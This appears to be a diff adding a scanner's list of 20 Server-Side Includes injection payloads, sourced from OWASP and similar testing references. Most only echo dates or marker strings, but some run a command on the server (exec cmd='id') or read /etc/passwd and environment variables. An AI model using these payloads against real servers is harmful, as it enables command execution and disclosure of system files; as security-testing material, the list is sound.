@@ -1,0 +1,25 @@
+# Server-Side Includes (SSI) Injection payloads
+# WSTG: WSTG-INPV-08 (Server-side Includes Injection)
+# Source: OWASP WSTG v4.2 / HackTricks SSI / PortSwigger
+# Format: one payload per line; # comments only in header/sections.
+# Total: 20 payloads
+<!--#echo var="DATE_LOCAL" -->
+<!--#echo var="DATE_GMT" -->
+<!--#echo var="DOCUMENT_NAME" -->
+<!--#echo var="DOCUMENT_URI" -->
+<!--#echo var="LAST_MODIFIED" -->
+<!--#echo var="REMOTE_ADDR" -->
+<!--#echo var="HTTP_USER_AGENT" -->
+<!--#echo var="NOTSCAN_SSI_MARKER" -->
+<!--#printenv -->
+<!--#exec cmd="id" -->
+<!--#exec cmd="echo NOTSCAN_SSI_MARKER" -->
+<!--#include file="/etc/passwd" -->
+<!--#include virtual="/index.html" -->
+<!--#config timefmt="%Y" --><!--#echo var="DATE_LOCAL" -->
+<!--#set var="notscan" value="ssi_marker" --><!--#echo var="notscan" -->
+<!--#if expr="1=1" -->NOTSCAN_SSI_MARKER<!--#endif -->
+1<!--#echo var="DATE_LOCAL" -->
+"><!--#echo var="DATE_LOCAL" -->
+<!--#flastmod file="/etc/passwd" -->
+<!--#fsize file="/etc/passwd" -->
